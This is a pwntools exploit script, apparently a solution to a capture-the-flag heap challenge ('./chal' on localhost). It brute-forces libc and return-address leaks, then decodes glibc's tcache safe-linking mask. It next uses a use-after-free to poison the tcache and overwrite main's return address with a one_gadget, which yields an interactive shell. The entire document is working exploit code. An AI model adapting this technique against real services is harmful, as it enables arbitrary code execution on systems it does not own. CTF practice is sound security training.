from pwn import *
import logging
#context(log_level='debug')
context.terminal = ['tmux','splitw','-h']
LIBC = ELF('./libc.so.6')
#rop= ROP("./libc.so.6")
#print (rop.find_gadget(['pop rdi','ret']))

ENV = {"LD_PRELOAD":"./libc.so.6"}

p = process("./chal", env=ENV)
p = remote("localhost",31339)
# libc address leak 
### offset index 21
LIBC_LEAK = 0

for i in range(0,6):
	for h in range(0x01,0xff):
		p.sendlineafter("cmd: ","1")
		p.sendline("21")
		LIBC_LEAK += (h << (i*8)) 
		p.sendline(p64(LIBC_LEAK))
		p.sendlineafter("cmd: ","4")
		data = str(p.recvuntil(".\n"))
		if( "success." in data ): break;
		LIBC_LEAK -= (h << (i*8))
print("libc leak: {}".format(hex(LIBC_LEAK)))

#raw_input(">")

# return addr leak
### offset index 10
RETURN_LEAK = 0 
for i in range(0,6):
	for h in range(0x01,0xff):
		p.sendlineafter("cmd: ","1")
		p.sendline("10")
		RETURN_LEAK += (h << (i*8)) 
		p.sendline(p64(RETURN_LEAK))
		p.sendlineafter("cmd: ","4")
		data = str(p.recvuntil(".\n"))
		if( "success." in data ): break;
		RETURN_LEAK -= (h << (i*8))
print("main return leak: {}".format(hex(RETURN_LEAK)))

#raw_input(">")

lib_base = LIBC_LEAK - 0x29d90
one_shot = lib_base + 0xebcf8
return_addr = RETURN_LEAK
#free_hook = lib_base + LIBC.symbols['__free_hook']

# make tcache[0x20]->tcache[0x20]
p.sendlineafter("cmd: ", "1")
p.sendline("0")
p.sendline("AAAAAAAAAAAA")
print(p.sendlineafter("cmd: ","1"))
p.sendline("1")
p.sendline("BBBBBBBBBBBB")
print(p.sendlineafter("cmd: ","1"))
p.sendline("2")
p.sendline("CCCCCCBBBBCC")

p.sendlineafter("cmd: ","2")
p.sendline("0")
p.sendlineafter("cmd: ","2")
p.sendline("1")

# Read tcache->protected_address
p.sendlineafter("cmd: ","3")
node_list = p.recvuntil("----\n").split();

print(node_list)
print(node_list[0][2::])
safe_link1 = u64(node_list[0][2::].ljust(8,b'\x00'))
next_link = (safe_link1 >> 36) ^ 0 
next_link = (safe_link1 >> 24) ^ next_link
next_link = (safe_link1 >> 12) ^ next_link
next_link = (safe_link1 >> 0) ^ next_link
pos = next_link ^ safe_link1


print("pos: 0x%x"% pos)
print("ret: 0x%x"%(return_addr))
print("oneshot: 0x%x"%(one_shot))
print("libc_base: 0x%x"%(lib_base))
print("target fd: 0x%x"%(return_addr^pos))

context(log_level='debug')

# UAF overwrite protect_link to main return address 
p.sendlineafter("cmd: ","1")
p.sendline("1")
p.sendline(p64(return_addr^pos))

# malloc chunk-5 to set tcache-> main return addr 
p.sendlineafter("cmd: ","1")
p.sendline("5")
p.sendline("FFFFFFF")
 
# malloc chunk-6 to alloc main_return addr (set oneshot gadget) 
#gdb.attach(p)
p.sendlineafter("cmd: ","1")
p.sendline("6")
p.sendline(p64(0x5050505050505050)+p64(one_shot))
p.sendlineafter("cmd: ","1")
p.sendline("6")

# onegadget needs writable $rbp 
p.sendline(p64(return_addr)[0:7])
raw_input(">")

# set rsi=0 for 
p.sendlineafter("cmd: ","2")
p.sendline("0")
p.sendlineafter("cmd: ","0")
# end - call free 
#p.sendlineafter("cmd: ","9")
p.interactive()
